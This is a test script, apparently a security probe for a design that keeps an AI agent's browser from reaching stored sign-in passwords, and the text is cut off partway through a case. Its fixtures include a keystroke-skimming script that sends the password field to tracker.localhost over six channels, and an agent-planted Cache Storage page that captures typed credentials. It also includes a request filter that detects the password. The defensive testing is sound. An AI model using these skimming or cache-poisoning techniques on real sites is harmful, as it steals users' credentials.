// The round-1 probe of the stored sign-in credentials design (board ab-v16.95, fix round 1 of review-104). Not product
// code, not part of npm test. Linux only. It starts its own Xvfb on display 175 (its own X authority, its framebuffer
// in a file of its own run folder) and its own Chromium on a temp profile with --remote-debugging-pipe (no port) and a
// small extension that it writes into its run folder (--load-extension). The extension plays the receiver: it uses only
// extension APIs (chrome.debugger, chrome.windows, chrome.cookies, chrome.declarativeNetRequest), as the agent browser's
// receiver must. The pipe plays the harness and the agent. Local pages on login.localhost and tracker.localhost only
// (every other host maps to nothing, and the proxy is a closed local port); fake values that it makes itself. It prints
// booleans, counts, host names and error texts only, never a value. It removes its own temp profile and stops its own
// processes.
//
//   node probe-round1.ts --out-dir DIR [--display 175] [--chrome /usr/bin/chromium]

import { spawn, execFileSync, type ChildProcess } from "node:child_process";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import { createHash, randomBytes } from "node:crypto";
import type { Socket } from "node:net";
import { existsSync, mkdirSync, mkdtempSync, openSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { join, relative, resolve } from "node:path";
import { parseArgs } from "node:util";
import type { Readable, Writable } from "node:stream";
import { harnessGuard, reservedDisplay } from "../../../../test/live/guard.ts";

const { values } = parseArgs({ options: { "out-dir": { type: "string" }, display: { type: "string" }, chrome: { type: "string" } } });
const refuse = (m: string): never => { process.stderr.write(`probe: ${m}\n`); process.exit(2); };
if (!values["out-dir"]) refuse("usage: node probe-round1.ts --out-dir DIR [--display 175]");
if (process.platform !== "linux") refuse("linux only");
const DISPLAY = Number(values.display ?? 175);
if (DISPLAY !== 175) refuse("this probe runs on display 175 only");
const rd = reservedDisplay(DISPLAY, "--display"); if (rd) refuse(rd);
const CHROME = values.chrome ?? "/usr/bin/chromium";
const OUT = resolve(values["out-dir"]!);
mkdirSync(OUT, { recursive: true });
const RUN = mkdtempSync(join(OUT, "run-"));
const sleep = (ms: number) => new Promise((res) => setTimeout(res, ms));
const say = (l: string) => process.stderr.write(`${new Date().toISOString().slice(11, 23)} ${l}\n`);
const errText = (e: unknown) => (e instanceof Error ? e.message : String(e)).split("\n")[0].slice(0, 200);

// ---------------------------------------------------------------- the fake values (made here, never printed)
const U = `probe-user-${randomBytes(4).toString("hex")}`;
const P = `Pw-${randomBytes(12).toString("base64url")}`; // 19 US-layout characters
const C = `Contrast-${randomBytes(9).toString("base64url")}`; // typed only into the agent's page of the contrast case
const b64url = (s: string) => Buffer.from(s).toString("base64url");
const oldForms = (s: string) => [s, encodeURIComponent(s), JSON.stringify(s).slice(1, -1), Buffer.from(s).toString("base64")];
const allForms = (s: string) => [...oldForms(s), b64url(s)];
const has = (text: string | undefined | null, s: string) => !!text && allForms(s).some((f) => text.includes(f));
const hasPrefix = (text: string | undefined | null, s: string) => {
  if (!text) return false;
  for (let n = 4; n < s.length; n++) if (has(text, s.slice(0, n))) return true;
  return false;
};

// ---------------------------------------------------------------- processes, guard, Xvfb
const children: ChildProcess[] = [];
const pidFile = join(OUT, "pids.txt");
const track = (c: ChildProcess, what: string) => { children.push(c); writeFileSync(pidFile, `${c.pid} ${what}\n`, { flag: "a" }); harness.track(c.pid, what); };
process.on("exit", () => {
  for (const c of children.reverse()) if (c.exitCode === null && c.signalCode === null) c.kill("SIGTERM");
  rmSync(RUN, { recursive: true, force: true }); // the probe's own temp profile, extension, framebuffer and X authority
});
for (const sig of ["SIGINT", "SIGTERM"] as const) process.on(sig, () => process.exit(130));
const harness = await harnessGuard("ab-v16-95-credentials-probe-round1");
if (existsSync(`/tmp/.X11-unix/X${DISPLAY}`) || existsSync(`/tmp/.X${DISPLAY}-lock`)) refuse(`display :${DISPLAY} is in use`);
const field = (b: Buffer) => { const n = Buffer.alloc(2); n.writeUInt16BE(b.length); return Buffer.concat([n, b]); };
const xauth = join(RUN, "Xauthority");
writeFileSync(xauth, Buffer.concat([Buffer.from([0xff, 0xff]), field(Buffer.alloc(0)), field(Buffer.from(String(DISPLAY))),
  field(Buffer.from("MIT-MAGIC-COOKIE-1")), field(randomBytes(16))]), { mode: 0o600 });
const FB = join(RUN, "fb"); mkdirSync(FB);
const SCREEN = { w: 1280, h: 900 };
const xvfb = spawn("Xvfb", [`:${DISPLAY}`, "-auth", xauth, "-nolisten", "tcp", "-fbdir", FB, "-screen", "0", `${SCREEN.w}x${SCREEN.h}x24`], { stdio: "ignore" });
track(xvfb, "Xvfb");
for (let i = 0; i < 50 && !existsSync(`/tmp/.X11-unix/X${DISPLAY}`) && xvfb.exitCode === null; i++) await sleep(100);
await sleep(300);
if (xvfb.exitCode !== null) refuse("Xvfb did not start");
const XENV: NodeJS.ProcessEnv = { ...process.env, DISPLAY: `:${DISPLAY}`, XAUTHORITY: xauth };
delete XENV.WAYLAND_DISPLAY; delete XENV.XDG_SESSION_TYPE;
const xdo = (...args: string[]) => { try { return execFileSync("xdotool", args, { env: XENV, encoding: "utf8", timeout: 5000 }).trim(); } catch (e) { return `error ${errText(e)}`; } };
say(`Xvfb :${DISPLAY} pid ${xvfb.pid}`);

// The live view reads frames of the Xvfb framebuffer file (agentwatch's first browser design, 5.6). Count the pixels of
// one colour in that file (XWD: a header, a colour map, then 32-bit pixels).
const ACT_RGB = [0x12, 0xe7, 0x5a];
const ACT_CSS = "#12e75a";
function fbCount(): number | string {
  try {
    const b = readFileSync(join(FB, "Xvfb_screen0"));
    const be = b.readUInt32BE(4) === 7; // XWD file_version 7, in the writer's byte order
    const header = be ? b.readUInt32BE(0) : b.readUInt32LE(0), ncolors = be ? b.readUInt32BE(76) : b.readUInt32LE(76);
    let n = 0;
    for (let i = header + ncolors * 12; i + 3 < b.length; i += 4) {
      if ((b[i] === ACT_RGB[2] && b[i + 1] === ACT_RGB[1] && b[i + 2] === ACT_RGB[0]) || (b[i + 1] === ACT_RGB[0] && b[i + 2] === ACT_RGB[1] && b[i + 3] === ACT_RGB[2])) n++;
    }
    return n;
  } catch (e) { return `error ${errText(e)}`; }
}

// ---------------------------------------------------------------- the local server (login.localhost, tracker.localhost)
type Chan = { requests: number; whole: number; prefix: number };
const tracker: Record<string, Chan> = {};
const hit = (chan: string, text: string) => {
  const c = (tracker[chan] ??= { requests: 0, whole: 0, prefix: 0 });
  c.requests++;
  if (has(text, P)) c.whole++; else if (hasPrefix(text, P)) c.prefix++;
};
const sessions = new Set<string>();
const tokens = new Set<string>();
const body = (req: IncomingMessage) => new Promise<string>((res) => { let b = ""; req.setEncoding("utf8"); req.on("data", (d) => (b += d)); req.on("end", () => res(b)); });
const PORT_PH = "__PORT__";
const TR = `http://tracker.localhost:${PORT_PH}`;
// The act's sign-in page: a sign-in by fetch (a cookie, and a token that the site keeps in localStorage), with a
// third-party script that sends the password field's value at each key through six channels.
const ACT_PAGE = (v: string) => `<!doctype html><html><head><meta charset=utf-8><title>actwin</title>
<style>html,body{margin:0;height:100%;background:${ACT_CSS}}</style></head><body>
<p id=note></p><div id=box><input id=u autocomplete=username> <input id=p type=password autocomplete=current-password> <button id=go>Sign in</button></div>
<script>
window.__agentPage = false;
${v === "flip" ? "document.getElementById('p').addEventListener('input', (e) => { if (e.target.value.length >= 3) e.target.type = 'text'; });" : ""}
${v === "flip" ? `try { window.__wsAtLoad = new WebSocket('ws://tracker.localhost:${PORT_PH}/c/wsload'); } catch (e) {}` : ""}
let ws = null; const w = new Worker('/worker.js');
let swReg = null; navigator.serviceWorker.register('/sw-act.js', { scope: '/sw-act-scope/' }).then((r) => { swReg = r; }, () => {});
const send = (v) => {
  const d = JSON.stringify({ v });
  fetch('${TR}/c/fetch', { method: 'POST', mode: 'no-cors', body: d }).catch(() => {});
  new Image().src = '${TR}/c/img?d=' + btoa(v).replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');
  try { navigator.sendBeacon('${TR}/c/beacon', d); } catch (e) {}
  if (ws === null) { try { ws = new WebSocket('ws://tracker.localhost:${PORT_PH}/c/ws'); ws.onerror = () => {}; } catch (e) { ws = false; } }
  if (ws && ws.readyState === 1) ws.send(d); else if (ws) ws.addEventListener('open', () => ws.send(d), { once: true });
  w.postMessage(v);
  const sw = swReg && (swReg.active || swReg.installing || swReg.waiting); if (sw) sw.postMessage(v);
};
document.getElementById('p').addEventListener('input', (e) => send(e.target.value));
document.getElementById('go').addEventListener('click', async () => {
  const r = await fetch('/api/session', { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value }) });
  if (r.ok) { const j = await r.json(); localStorage.setItem('tok', j.token); history.pushState({}, '', '/spa-home');
    document.getElementById('box').style.display = 'none'; document.getElementById('note').textContent = 'signed in';
    document.title = 'Welcome ' + document.getElementById('u').value; }
  else document.getElementById('note').textContent = 'wrong';
});
</script></body></html>`;
// The agent's page that the agent puts into Cache Storage in place of the sign-in page: it passes each typed value to
// the agent's own tab of the origin by BroadcastChannel and by localStorage.
const AGENT_PAGE = `<!doctype html><html><head><meta charset=utf-8><title>actwin</title></head><body>
<div id=box><input id=u autocomplete=username> <input id=p type=password> <button id=go>Sign in</button></div>
<script>window.__agentPage = true; const bc = new BroadcastChannel('x');
for (const el of document.querySelectorAll('input')) el.addEventListener('input', () => { bc.postMessage(el.value); localStorage.setItem('leak', el.value); });</script>
</body></html>`;
// The agent's setup page: it plants AGENT_PAGE in Cache Storage for two sign-in paths, writes a marker, and registers the
// site's cache-first service worker (as many sites with Workbox have).
const SETUP_PAGE = `<!doctype html><html><head><meta charset=utf-8><title>setup</title></head><body><script>
window.__ready = (async () => {
  const c = await caches.open('site');
  for (const p of ['/signin', '/signin-act?v=main']) await c.put(p, new Response(${JSON.stringify(AGENT_PAGE).replace(/<\//g, "<\\/")}, { headers: { 'content-type': 'text/html; charset=utf-8' } }));
  localStorage.setItem('agent_marker', 'set');
  const r = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
  await navigator.serviceWorker.ready;
  return !!r.active;
})();
</script></body></html>`;
const LISTEN_PAGE = `<!doctype html><html><head><meta charset=utf-8><title>listen</title></head><body><script>
window.__bc = []; window.__st = []; new BroadcastChannel('x').onmessage = (e) => window.__bc.push(String(e.data));
addEventListener('storage', (e) => window.__st.push(String(e.newValue)));
</script></body></html>`;
const SW = `self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => e.respondWith(caches.match(e.request).then((r) => r || fetch(e.request))));`;
const SW_ACT = `self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('message', (e) => { fetch('${TR}/c/sw', { method: 'POST', mode: 'no-cors', body: JSON.stringify({ v: e.data }) }).catch(() => {}); });`;
const WORKER = `onmessage = (e) => { fetch('${TR}/c/worker', { method: 'POST', mode: 'no-cors', body: JSON.stringify({ v: e.data }) }).catch(() => {}); };`;

let PORT = 0;
const server = createServer(async (req: IncomingMessage, res: ServerResponse) => {
  const host = (req.headers.host ?? "").split(":")[0];
  const url = new URL(req.url ?? "/", "http://parse.invalid"); // only a base for the parse; never contacted
  const send = (code: number, text: string, type = "text/html; charset=utf-8", headers: Record<string, string> = {}) => {
    res.writeHead(code, { "content-type": type, ...headers }); res.end(text.replaceAll(PORT_PH, String(PORT)));
  };
  if (host === "tracker.localhost") {
    const b = await body(req);
    const chan = url.pathname.startsWith("/c/") ? url.pathname.slice(3) : "other";
    hit(chan, `${b} ${decodeURIComponent(req.url ?? "")}`);
    res.writeHead(204, { "access-control-allow-origin": "*" }); res.end(); return;
  }
  if (host !== "login.localhost") { res.writeHead(404); res.end(); return; }
  const cookieSid = (req.headers.cookie ?? "").split(/;\s*/).map((c) => c.replace(/^sid=/, ""));
  const signedIn = cookieSid.some((s) => sessions.has(s));
  const p = url.pathname;
  if (p === "/signin" || p === "/signin-act") return send(200, ACT_PAGE(url.searchParams.get("v") ?? "main"));
  if (p === "/setup") return send(200, SETUP_PAGE);
  if (p === "/listen") return send(200, LISTEN_PAGE);
  if (p === "/sw.js") return send(200, SW, "text/javascript");
  if (p === "/sw-act.js") return send(200, SW_ACT, "text/javascript");
  if (p === "/worker.js") return send(200, WORKER, "text/javascript");
  if (p === "/blank") return send(200, `<!doctype html><title>blank</title><p>blank</p>`);
  if (req.method === "POST" && p === "/api/session") {
    const j = JSON.parse((await body(req)) || "{}");
    if (j.username === U && j.password === P) {
      const sid = randomBytes(8).toString("hex"); sessions.add(sid);
      const tok = randomBytes(8).toString("hex"); tokens.add(tok);
      return send(200, JSON.stringify({ token: tok }), "application/json", { "set-cookie": `sid=${sid}; Path=/; HttpOnly; SameSite=Lax` });
    }
    return send(401, "{}", "application/json");
  }
  if (p === "/api/me") {
    const t = (req.headers.authorization ?? "").replace(/^Bearer /, "");
    return send(tokens.has(t) ? 200 : 401, "{}", "application/json");
  }
  if (p === "/home") return send(200, `<!doctype html><title>home</title><p id=state>${signedIn ? "signed in" : "not signed in"}</p>`);
  if (p === "/spa-home") return send(200, `<!doctype html><title>spa home</title><p id=state>wait</p><script>
    fetch('/api/me', { headers: { authorization: 'Bearer ' + (localStorage.getItem('tok') || '') } })
      .then((r) => { document.getElementById('state').textContent = r.ok ? 'signed in' : 'not signed in'; });</script>`);
  res.writeHead(404); res.end();
});
// A small WebSocket end on tracker.localhost: it counts the upgrades and reads the client's text frames.
server.on("upgrade", (req: IncomingMessage, sock: Socket) => {
  const host = (req.headers.host ?? "").split(":")[0];
  const chan = (req.url ?? "").startsWith("/c/") ? (req.url ?? "").slice(3) : "ws-other";
  if (host !== "tracker.localhost") { sock.destroy(); return; }
  const up = (tracker[`${chan}-upgrade`] ??= { requests: 0, whole: 0, prefix: 0 }); up.requests++;
  const accept = createHash("sha1").update(`${req.headers["sec-websocket-key"]}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
  sock.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
  let buf = Buffer.alloc(0);
  sock.on("data", (d: Buffer) => {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 2) {
      const op = buf[0] & 0x0f; let len = buf[1] & 0x7f; let off = 2;
      if (len === 126) { if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4; } else if (len === 127) { sock.destroy(); return; }
      const masked = (buf[1] & 0x80) !== 0; const mask = masked ? buf.subarray(off, off + 4) : null; if (masked) off += 4;
      if (buf.length < off + len) return;
      const pl = Buffer.from(buf.subarray(off, off + len)); if (mask) for (let i = 0; i < pl.length; i++) pl[i] ^= mask[i % 4];
      buf = buf.subarray(off + len);
      if (op === 1) hit(chan, pl.toString("utf8")); else if (op === 8) { sock.end(); return; }
    }
  });
  sock.on("error", () => {});
});
await new Promise<void>((res) => server.listen(0, "127.0.0.1", () => res()));
PORT = (server.address() as { port: number }).port;
const ORIGIN = `http://login.localhost:${PORT}`;
say(`server on 127.0.0.1:${PORT}`);

// ---------------------------------------------------------------- the extension (plays the receiver)
const EXT = join(RUN, "ext"); mkdirSync(EXT);
writeFileSync(join(EXT, "manifest.json"), JSON.stringify({
  manifest_version: 3, name: "ab-v16.95 probe receiver", version: "1.0", background: { service_worker: "sw.js" },
  permissions: ["debugger", "tabs", "cookies", "declarativeNetRequest"], host_permissions: ["http://login.localhost/*", "http://tracker.localhost/*"],
  incognito: "spanning",
}));
writeFileSync(join(EXT, "x.html"), "<!doctype html><title>x</title><script src=x.js></script>");
writeFileSync(join(EXT, "x.js"), "chrome.runtime.sendMessage('wake').catch(() => {});");
writeFileSync(join(EXT, "sw.js"), `
const evs = [];
chrome.runtime.onInstalled.addListener(() => {});
chrome.runtime.onMessage.addListener(() => {});
const G = { on: false, tab: -1, origin: '', pw: '', mode: 'old', blocked: [], continued: 0, paused: [], ws: [] };
const forms = (s) => [s, encodeURIComponent(s), JSON.stringify(s).slice(1, -1), btoa(s)];
const holds = (t, s) => !!t && forms(s).some((f) => t.includes(f));
chrome.debugger.onEvent.addListener((src, method, params) => {
  if (method === 'Network.webSocketCreated' && src.tabId === G.tab) G.ws.push(new URL(params.url).host);
  if (method === 'Fetch.requestPaused') {
    const t = { tabId: src.tabId, ...(src.sessionId ? { sessionId: src.sessionId } : {}) };
    const rq = params.request; let host = ''; try { host = new URL(rq.url).host; } catch (e) {}
    G.paused.push({ host, type: params.resourceType, scheme: rq.url.split(':')[0] });
    let fail = false;
    if (G.on && src.tabId === G.tab) {
      const same = rq.url.startsWith(G.origin + '/');
      const unknown = rq.hasPostData && rq.postData === undefined;
      let dec = rq.url; try { dec = decodeURIComponent(rq.url); } catch (e) {}
      fail = holds(dec, G.pw) || (!same && (holds(rq.postData, G.pw) || unknown));
    }
    if (fail) { G.blocked.push(host); chrome.debugger.sendCommand(t, 'Fetch.failRequest', { requestId: params.requestId, errorReason: 'BlockedByClient' }).catch(() => {}); }
    else { G.continued++; chrome.debugger.sendCommand(t, 'Fetch.continueRequest', { requestId: params.requestId }).catch(() => {}); }
    return;
  }
  if (evs.length < 400) evs.push({ tabId: src.tabId, method });
});
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
globalThis.R = {
  G, evs,
  att: (tabId) => chrome.debugger.attach({ tabId }, '1.3'),
  det: (tabId) => chrome.debugger.detach({ tabId }).catch(() => {}),
  send: (tabId, method, params) => chrome.debugger.sendCommand({ tabId }, method, params || {}),
  async ev(tabId, expression, contextId) {
    const r = await chrome.debugger.sendCommand({ tabId }, 'Runtime.evaluate', { expression, returnByValue: true, awaitPromise: true, ...(contextId ? { contextId } : {}) });
    return r.result ? r.result.value : undefined;
  },
  async click(tabId, sel, ctx) {
    const b = await R.ev(tabId, '(() => { const r = document.querySelector(' + JSON.stringify(sel) + ').getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()', ctx);
    for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased']) {
      await chrome.debugger.sendCommand({ tabId }, 'Input.dispatchMouseEvent', { type, x: b.x, y: b.y, button: type === 'mouseMoved' ? 'none' : 'left', buttons: type === 'mousePressed' ? 1 : 0, clickCount: 1 });
      await sleep(30);
    }
  },
  async type(tabId, text, watchCtx) {
    let n = 0;
    for (const ch of text) {
      await chrome.debugger.sendCommand({ tabId }, 'Input.dispatchKeyEvent', { type: 'keyDown', key: ch, text: ch, unmodifiedText: ch });
      await chrome.debugger.sendCommand({ tabId }, 'Input.dispatchKeyEvent', { type: 'keyUp', key: ch });
      n++;
      if (watchCtx && await R.ev(tabId, 'window.__typeChanged === true', watchCtx)) return { stopped: true, typed: n };
      await sleep(40);
    }
    return { stopped: false, typed: n };
  },
  async waitLoad(tabId, ms) {
    const t0 = Date.now();
    while (Date.now() - t0 < ms) { try { if (await R.ev(tabId, 'document.readyState') === 'complete') return true; } catch (e) {} await sleep(100); }
    return false;
  },
  async go(tabId, url) { await chrome.debugger.sendCommand({ tabId }, 'Page.navigate', { url }); await sleep(300); return R.waitLoad(tabId, 10000); },
  incognitoStore: async (tabId) => { const s = await chrome.cookies.getAllCookieStores(); const f = s.find((x) => x.tabIds.includes(tabId)); return f ? f.id : null; },
  stores: async () => (await chrome.cookies.getAllCookieStores()).map((s) => s.id),
};
`);

// ---------------------------------------------------------------- Chromium over a pipe, a small CDP client
type Ev = { method: string; params: any; sessionId?: string };
class Chrome {
  proc: ChildProcess; dir: string;
  private buf = ""; private next = 1;
  private pending = new Map<number, (m: any) => void>();
  listeners: ((e: Ev) => void)[] = [];
  constructor(name: string, prefs: object) {
    this.dir = join(RUN, `profile-${name}`);
    mkdirSync(join(this.dir, "Default"), { recursive: true });
    writeFileSync(join(this.dir, "Default", "Preferences"), JSON.stringify(prefs));
    const log = openSync(join(RUN, `chrome-${name}.log`), "a");
    const args = ["--remote-debugging-pipe", "--no-first-run", "--no-default-browser-check", "--ozone-platform=x11", "--password-store=basic",
      "--disable-background-networking", "--disable-component-update", "--disable-sync", "--disable-default-apps",
      `--load-extension=${EXT}`, "--silent-debugger-extension-api", "--disable-backgrounding-occluded-windows",
      "--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE login.localhost , EXCLUDE tracker.localhost", "--proxy-server=http://127.0.0.1:9",
      "--proxy-bypass-list=login.localhost;tracker.localhost", "--window-position=0,0", "--window-size=1200,850", `--user-data-dir=${this.dir}`, "about:blank"];
    this.proc = spawn(CHROME, args, { env: XENV, stdio: ["ignore", log, log, "pipe", "pipe"] });
    track(this.proc, `chromium-${name}`);
    const r = this.proc.stdio[4] as Readable;
    r.setEncoding("utf8");
    r.on("data", (d: string) => {
      this.buf += d;
      for (let i; (i = this.buf.indexOf("\0")) >= 0;) {
        const m = JSON.parse(this.buf.slice(0, i)); this.buf = this.buf.slice(i + 1);
        if (m.id !== undefined) { this.pending.get(m.id)?.(m); this.pending.delete(m.id); }
        else for (const l of [...this.listeners]) l(m);
      }
    });
  }
  send(method: string, params: object = {}, sessionId?: string, ms = 30000): Promise<any> {
    const id = this.next++;
    return new Promise((res, rej) => {
      const t = setTimeout(() => { this.pending.delete(id); rej(new Error(`timeout ${method}`)); }, ms);
      this.pending.set(id, (m) => { clearTimeout(t); m.error ? rej(new Error(`${method}: ${m.error.message}`)) : res(m.result); });
      (this.proc.stdio[3] as Writable).write(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }) + "\0");
    });
  }
  async close() {
    try { await this.send("Browser.close", {}, undefined, 5000); } catch { /* it may close before it answers */ }
    for (let i = 0; i < 100 && this.proc.exitCode === null && this.proc.signalCode === null; i++) await sleep(100);
    if (this.proc.exitCode === null && this.proc.signalCode === null) this.proc.kill("SIGTERM");
    await sleep(500);
  }
}
async function attach(c: Chrome, targetId: string) {
  const { sessionId } = await c.send("Target.attachToTarget", { targetId, flatten: true });
  return sessionId as string;
}
async function pageTab(c: Chrome, url: string) {
  const { targetId } = await c.send("Target.createTarget", { url: "about:blank" });
  const s = await attach(c, targetId);
  await c.send("Page.enable", {}, s); await c.send("Runtime.enable", {}, s);
  await c.send("Page.navigate", { url }, s);
  for (let t = 0; t < 10000; t += 100) { try { if ((await evaluate(c, s, "document.readyState")) === "complete") break; } catch { /* navigating */ } await sleep(100); }
  await sleep(200);
  return { targetId: targetId as string, s };
}
async function evaluate(c: Chrome, s: string, expression: string) {
  const r = await c.send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true }, s);
  if (r.exceptionDetails) throw new Error(`evaluate: ${r.exceptionDetails.exception?.description?.split("\n")[0] ?? r.exceptionDetails.text}`);
  return r.result?.value;
}
async function extWorker(c: Chrome, wakeId?: string) {
  for (let i = 0; i < 100; i++) {
    const { targetInfos } = await c.send("Target.getTargets");
    const t = targetInfos.find((x: any) => x.type === "service_worker" && x.url.startsWith("chrome-extension://") && x.url.endsWith("/sw.js"));
    if (t) {
      try {
        const s = await attach(c, t.targetId); await c.send("Runtime.enable", {}, s);
        if ((await evaluate(c, s, "typeof R")) === "object") return { id: new URL(t.url).host, targetId: t.targetId as string, s };
      } catch { /* a worker that stops now */ }
    }
    // An extension's worker starts at an event: a page of the extension wakes it.
    if (wakeId && i % 10 === 5) {
      const { targetId } = await c.send("Target.createTarget", { url: `chrome-extension://${wakeId}/x.html` });
      await sleep(800); await c.send("Target.closeTarget", { targetId }).catch(() => {});
    }
    await sleep(300);
  }
  const { targetInfos } = await c.send("Target.getTargets");
  say(`no worker; targets: ${targetInfos.map((x: any) => `${x.type}:${x.url.startsWith("chrome-extension://") ? "ext" : x.url.split(":")[0]}`).join(" ")}`);
  throw new Error("no extension worker");
}
const J = JSON.stringify;

// ---------------------------------------------------------------- the profile checks after the close
function scan(dir: string) {
  const hits: Record<string, string[]> = { password: [], username: [], contrast: [] };
  const walk = (d: string) => {
    for (const n of readdirSync(d)) {
      const p = join(d, n);
      let st; try { st = statSync(p); } catch { continue; }
      if (st.isDirectory()) walk(p);
      else if (st.isFile() && st.size < 64 * 1024 * 1024) {
        let b: Buffer; try { b = readFileSync(p); } catch { continue; }
        if (allForms(P).some((f) => b.includes(Buffer.from(f)))) hits.password.push(relative(dir, p));
        if (b.includes(Buffer.from(U))) hits.username.push(relative(dir, p));
        if (b.includes(Buffer.from(C))) hits.contrast.push(relative(dir, p));
      }
    }
  };
  walk(dir);
  return hits;
}
function sql(db: string, q: string, ...args: string[]): number | string {
  if (!existsSync(db)) return "no file";
  try { return Number(execFileSync("python3", ["-c", "import sqlite3,sys; c=sqlite3.connect('file:'+sys.argv[1]+'?mode=ro', uri=True); print(c.execute(sys.argv[2], tuple(sys.argv[3:])).fetchone()[0])", db, q, ...args], { encoding: "utf8" }).trim()); }
  catch (e) { return `error ${errText(e)}`; }
}

// Chromium's id of an unpacked extension: SHA-256 of its absolute path, the first 16 bytes in hex, each digit as a-p.
const EXT_ID = createHash("sha256").update(EXT).digest("hex").slice(0, 32).replace(/[0-9a-f]/g, (d) => String.fromCharCode(97 + parseInt(d, 16)));
const out: Record<string, any> = { chrome: "", cases: {} };
const PREFS = { extensions: { settings: { [EXT_ID]: { incognito: true } } }, credentials_enable_service: false, profile: { password_manager_enabled: false, password_manager_leak_detection: false },
  autofill: { enabled: false, profile_enabled: false, credit_card_enabled: false } };
const c = new Chrome("round1", PREFS);
try {
  out.chrome = (await c.send("Browser.getVersion")).product;
  let X = await extWorker(c);
  const R = async (expr: string) => evaluate(c, X.s, expr);

  // ---- E1: what the receiver's chrome.debugger may do: a new browser context, a window's bounds
  {
    const tab = await R(`chrome.tabs.create({ url: 'about:blank' }).then((t) => t.id)`);
    await R(`R.att(${tab})`);
    const tryCmd = async (m: string, p: object) => { try { await R(`R.send(${tab}, ${J(m)}, ${J(p)})`); return "allowed"; } catch (e) { return errText(e).replace(/^evaluate: /, ""); } };
    out.cases.E1_debugger_scope = {
      createBrowserContext: await tryCmd("Target.createBrowserContext", { disposeOnDetach: true }),
      createTarget: await tryCmd("Target.createTarget", { url: "about:blank" }),
      setWindowBounds: await tryCmd("Browser.setWindowBounds", { windowId: 1, bounds: { left: 1400 } }),
    };
    await R(`R.det(${tab})`); await R(`chrome.tabs.remove(${tab})`);
    // an incognito window at this point (with the allow from the preferences, or before any allow)
    out.cases.E1_incognito_window = await R(`chrome.extension.isAllowedIncognitoAccess()`).then((a: boolean) => ({ allowed: a }));
    out.cases.E1_incognito_window.result = await R(`chrome.windows.create({ incognito: true, url: 'about:blank' }).then(async (w) => { if (!w) return { created: 'no window object' }; const t = w.tabs && w.tabs[0]; let att = 'no tab'; if (t) { try { await chrome.debugger.attach({ tabId: t.id }, '1.3'); att = 'attached'; await chrome.debugger.detach({ tabId: t.id }); } catch (e) { att = String(e.message || e); } } await chrome.windows.remove(w.id); return { created: true, tab_visible: !!t, attach: att }; }, (e) => ({ created: false, error: String(e.message || e) }))`);
  }

  // ---- the incognito allow: from the profile's preferences, else as chrome://extensions sets it
  out.cases.incognito_allowed_by_preferences = await R(`chrome.extension.isAllowedIncognitoAccess()`);
  out.cases.extension_id_as_computed = X.id === EXT_ID;
  if (!out.cases.incognito_allowed_by_preferences) {
    const { targetId } = await c.send("Target.createTarget", { url: `chrome://extensions/?id=${X.id}` });
    const s = await attach(c, targetId); await c.send("Runtime.enable", {}, s); await sleep(1500);
    out.cases.incognito_allow = await evaluate(c, s, `chrome.developerPrivate.updateExtensionConfiguration({ extensionId: ${J(X.id)}, incognitoAccess: true }).then(() => 'set', (e) => String(e.message || e))`);
    await c.send("Target.closeTarget", { targetId });
    await sleep(1500);
    await sleep(1500);
    X = await extWorker(c, X.id);
  }
  // an incognito window that is left (for example one that an earlier case opened) shares its context with the next
  // act, so the act's start closes every incognito window first
  out.cases.incognito_windows_left = await R(`chrome.windows.getAll().then(async (ws) => { const inc = ws.filter((w) => w.incognito); for (const w of inc) await chrome.windows.remove(w.id); return inc.length; })`);
  await sleep(800);

  // ---- the agent's setup in the default context: the planted page, the site's cache-first worker, a listener tab
  const setup = await pageTab(c, `${ORIGIN}/setup`);
  out.cases.agent_setup = { worker_active: await evaluate(c, setup.s, "window.__ready").catch((e: Error) => errText(e)) };
  const listen = await pageTab(c, `${ORIGIN}/listen`);
  const agentHome = await pageTab(c, `${ORIGIN}/home`);
  out.cases.agent_before_act = {
    home: await evaluate(c, agentHome.s, "document.getElementById('state').textContent"),
  };
  await c.send("Page.navigate", { url: `${ORIGIN}/spa-home` }, agentHome.s); await sleep(1200);
  out.cases.agent_before_act.spa_home = await evaluate(c, agentHome.s, "document.getElementById('state').textContent");

  // ---- K1: the contrast: a sign-in tab in the SAME context as the agent (the design before this round)
  {
    const tab = await R(`chrome.windows.create({ url: 'about:blank', focused: false }).then((w) => w.tabs[0].id)`);
    await R(`R.att(${tab})`); await R(`R.send(${tab}, 'Page.enable')`); await R(`R.send(${tab}, 'Runtime.enable')`);
    await R(`R.go(${tab}, ${J(`${ORIGIN}/signin`)})`);
    const served = await R(`R.ev(${tab}, 'window.__agentPage === true')`);
    await R(`R.click(${tab}, '#p')`); await R(`R.type(${tab}, ${J(C)})`); await sleep(400);
    const bc = await evaluate(c, listen.s, `window.__bc.some((v) => v === ${J(C)})`);
    const st = await evaluate(c, listen.s, `window.__st.some((v) => v === ${J(C)})`);
    // the review's fallback: bypass the service worker in the sign-in tab
    await R(`R.send(${tab}, 'Network.enable')`); await R(`R.send(${tab}, 'Network.setBypassServiceWorker', { bypass: true })`);
    await R(`R.go(${tab}, ${J(`${ORIGIN}/signin`)})`);
    const servedBypass = await R(`R.ev(${tab}, 'window.__agentPage === true')`);
    await R(`R.det(${tab})`); await R(`chrome.tabs.remove(${tab})`);
